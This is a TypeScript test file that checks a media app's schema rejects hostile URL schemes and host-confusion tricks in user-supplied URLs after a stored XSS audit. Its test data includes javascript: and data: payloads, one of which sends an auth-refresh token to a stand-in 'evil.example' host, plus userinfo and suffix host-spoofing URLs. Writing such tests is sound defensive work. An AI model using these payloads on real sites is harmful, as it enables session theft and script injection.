/**
 * Every user-supplied URL in the contract that a client hands to the browser.
 *
 * The audit that produced this file started from one stored XSS: rooms default
 * to `queueControl: 'everyone'`, any guest can join, and `embedUrl` was
 * `z.string().url()` — which is a `new URL()` in a try/catch and therefore
 * accepts 'javascript:alert(1)' without complaint. That string landed in
 * `iframe.src` on every viewer's page (apps/web/lib/player/embed.ts).
 *
 * The fix belongs here rather than at the call site, because web, mobile and
 * the extension each render these values through a different sink and the
 * contract is the only place that covers all three at once. So this file walks
 * the whole surface, not just the embed: one `it` per field that reaches a
 * sink, hostile scheme in, rejection out.
 *
 * `blob:` and `vbscript:` are in the scheme table alongside the obvious two
 * because 'not https' is the property being asserted — enumerating only the
 * schemes that happen to execute in the browser of the day is how the next one
 * gets in.
 */
import { describe, expect, it } from 'vitest';
import {
  EMBED_PROVIDER_HOSTS,
  MediaRef,
  MediaAsset,
  Message,
  MessageAttachment,
  QueueItem,
  QueueItemInput,
  User,
} from '../src/index';

const TS = 1_700_000_000_000;

/** Schemes a stored document must never be able to smuggle into a sink. */
const HOSTILE_SCHEMES = [
  'javascript:alert(1)',
  'data:text/html,<script>fetch("/auth/refresh").then(r=>r.text()).then(t=>fetch("https://evil.example/"+t))</script>',
  'blob:https://gather.watch/8f1c0d3e-0000-4000-8000-000000000000',
  'vbscript:msgbox(1)',
  'file:///etc/passwd',
] as const;

// ---------- embed: the reported blocker ----------

/** Exactly what apps/web/lib/providers.ts builds for each provider. */
const REAL_EMBEDS = [
  ['spotify', 'https://open.spotify.com/embed/track/4uLU6hMCjMI75M1A2tKUQC'],
  ['applemusic', 'https://embed.music.apple.com/us/album/example/12345'],
  ['tidal', 'https://embed.tidal.com/tracks/123456'],
  ['deezer', 'https://widget.deezer.com/widget/dark/track/987654'],
] as const;

const embed = (provider: string, embedUrl: string): unknown => ({
  kind: 'embed',
  provider,
  embedUrl,
  title: null,
});

describe('MediaRef embed.embedUrl', () => {
  it.each(REAL_EMBEDS)('accepts the real %s embed', (provider, url) => {
    expect(MediaRef.parse(embed(provider, url))).toEqual(embed(provider, url));
  });

  it.each(HOSTILE_SCHEMES)('rejects the scheme in %s', (embedUrl) => {
    expect(MediaRef.safeParse(embed('spotify', embedUrl)).success).toBe(false);
  });

  it('rejects a perfectly valid https URL on a host that is not the provider', () => {
    expect(MediaRef.safeParse(embed('spotify', 'https://evil.example/embed/track/1')).success).toBe(
      false,
    );
  });

  /**
   * The three ways a host check written as a bare `startsWith(host)` — or as a
   * `.includes()` / suffix match — lets an attacker keep the provider's name
   * in the string while the browser resolves somewhere else entirely.
   */
  it.each([
    // userinfo: everything before the last '@' in the authority is a username.
    'https://open.spotify.com@evil.example/embed/track/1',
    // suffix: a domain the attacker registered that ends with the real one.
    'https://open.spotify.com.evil.example/embed/track/1',
    // prefix: a subdomain-looking label that is really a different host.
    'https://notopen.spotify.com/embed/track/1',
    // the parser strips tabs and newlines BEFORE resolving the host, so the
    // raw string reads as the provider and the request goes to evil.example.
    'https://open.spotify.com\t@evil.example/embed/track/1',
  ])('rejects the host-confusion URL %j', (embedUrl) => {
    expect(MediaRef.safeParse(embed('spotify', embedUrl)).success).toBe(false);
  });

  /** Scheme and host are the case-insensitive parts of a URL, and a link
   *  copied out of a mail client can arrive shouting. Folding case is
   *  deliberate here — and stops at the '/', where it would be wrong. */
  it('accepts the provider host in any case, and only up to the path', () => {
    expect(
      MediaRef.safeParse(embed('spotify', 'https://OPEN.SPOTIFY.COM/embed/track/1')).success,
    ).toBe(true);
    expect(
      MediaRef.safeParse(embed('spotify', 'https://open.spotify.com/EMBED/track/1')).success,
    ).toBe(true);
  });

  it("rejects one provider's host under another provider's name", () => {
    expect(MediaRef.safeParse(embed('spotify', 'https://embed.tidal.com/tracks/1')).success).toBe(
      false,
    );
  });

  it('rejects a provider outside the four the enum names', () => {
    expect(MediaRef.safeParse(embed('bandcamp', 'https://bandcamp.com/EmbeddedPlayer/1')).success).toBe(
      false,
    );
  });

  /** The pin table and the provider enum must never drift apart: a fifth
   *  provider added without a host is a hole, not a feature. */
  it('pins a host for every provider the enum names', () => {
    expect(Object.keys(EMBED_PROVIDER_HOSTS).sort()).toEqual([
      'applemusic',
      'deezer',
      'spotify',
      'tidal',
    ]);
  });
});

// ---------- the rest of the audit ----------

const hostile = 'javascript:alert(document.domain)';

describe('MediaRef url members', () => {
  it('page.url stays https-only', () => {
    expect(MediaRef.safeParse({ kind: 'page', url: 'https://blog.example/the-film' }).success).toBe(
      true,
    );
    for (const url of HOSTILE_SCHEMES) {
      expect(MediaRef.safeParse({ kind: 'page', url }).success).toBe(false);
    }
  });

  it('hls.url rejects a hostile scheme', () => {
    expect(
      MediaRef.safeParse({ kind: 'hls', assetId: 'asset_1', url: hostile }).success,
    ).toBe(false);
  });

  it('url.url rejects a hostile scheme', () => {
    expect(
      MediaRef.safeParse({ kind: 'url', url: hostile, mime: 'video/mp4' }).success,
    ).toBe(false);
  });

  it('soundcloud.url rejects a hostile scheme', () => {
    expect(MediaRef.safeParse({ kind: 'soundcloud', url: hostile }).success).toBe(false);
  });

  /** Object storage is plain http on localhost in dev (services/api config.ts
   *  defaults the S3 endpoint to http://localhost:9000), so these fields ban
   *  the executing schemes rather than demanding TLS. */
  it('url.url still accepts the dev object-storage origin', () => {
    expect(
      MediaRef.safeParse({
        kind: 'url',
        url: 'http://localhost:9000/gather/asset_1.mp4',
        mime: 'video/mp4',
      }).success,
    ).toBe(true);
  });
});

const queueItem = {
  id: 'q_1',
  mediaRef: { kind: 'youtube', videoId: 'abc' },
  title: 'Cool video',
  durationMs: 60000,
  artworkUrl: 'https://example.com/art.png',
  addedBy: 'user_1',
  votesToSkip: [],
};

describe('artworkUrl', () => {
  it('QueueItem rejects a hostile scheme', () => {
    expect(QueueItem.safeParse({ ...queueItem, artworkUrl: hostile }).success).toBe(false);
  });

  it('QueueItemInput rejects a hostile scheme', () => {
    const { id: _id, addedBy: _addedBy, votesToSkip: _votes, ...input } = queueItem;
    expect(QueueItemInput.safeParse({ ...input, artworkUrl: hostile }).success).toBe(false);
    expect(QueueItemInput.safeParse(input).success).toBe(true);
  });
});

describe('MessageAttachment.url', () => {
  const attachment = {
    assetId: 'asset_1',
    url: 'https://cdn.example.com/a.png',
    mime: 'image/png',
    name: 'a.png',
    sizeBytes: 1024,
    width: 10,
    height: 10,
    durationMs: null,
  };

  /** This one is not theoretical either: chat.send carries a whole
   *  MessageAttachment from the client and the server stores it verbatim
   *  (services/api/src/modules/chat/service.ts), and the web renders a
   *  non-media attachment as <a href={att.url} target="_blank">. */
  it.each(HOSTILE_SCHEMES)('rejects the scheme in %s', (url) => {
    expect(MessageAttachment.safeParse({ ...attachment, url }).success).toBe(false);
  });

  it('accepts the dev object-storage origin', () => {
    expect(
      MessageAttachment.safeParse({ ...attachment, url: 'http://localhost:9000/gather/a.png' })
        .success,
    ).toBe(true);
  });
});

describe('other rendered urls', () => {
  it('User.avatarUrl rejects a hostile scheme', () => {
    const user = {
      id: 'user_1',
      email: null,
      displayName: 'Ann',
      avatarUrl: hostile,
      accentColor: '#a855f7',
      createdAt: TS,
    };
    expect(User.safeParse(user).success).toBe(false);
    expect(User.safeParse({ ...user, avatarUrl: 'https://cdn.example.com/a.png' }).success).toBe(
      true,
    );
  });

  it('Message.gifUrl rejects a hostile scheme', () => {
    const message = {
      id: 'msg_1',
      roomId: 'room_1',
      authorId: 'user_1',
      kind: 'gif',
      body: '',
      gifUrl: hostile,
      attachment: null,
      replyTo: null,
      mentions: [],
      reactions: {},
      pinned: false,
      editedAt: null,
      deletedAt: null,
      seq: 1,
      createdAt: TS,
    };
    expect(Message.safeParse(message).success).toBe(false);
    expect(
      Message.safeParse({ ...message, gifUrl: 'https://media.tenor.com/x.gif' }).success,
    ).toBe(true);
  });

  it('MediaAsset url fields reject a hostile scheme', () => {
    const asset = {
      id: 'asset_1',
      ownerId: 'user_1',
      filename: 'song.mp3',
      mime: 'audio/mpeg',
      sizeBytes: 1024,
      status: 'ready',
      hlsUrl: 'https://cdn.example.com/a/master.m3u8',
      thumbnailUrl: 'https://cdn.example.com/a/thumb.png',
      waveformUrl: 'https://cdn.example.com/a/wave.json',
      durationMs: 1000,
      error: null,
      createdAt: TS,
    };
    expect(MediaAsset.safeParse(asset).success).toBe(true);
    for (const field of ['hlsUrl', 'thumbnailUrl', 'waveformUrl'] as const) {
      expect(MediaAsset.safeParse({ ...asset, [field]: hostile }).success).toBe(false);
    }
  });
});
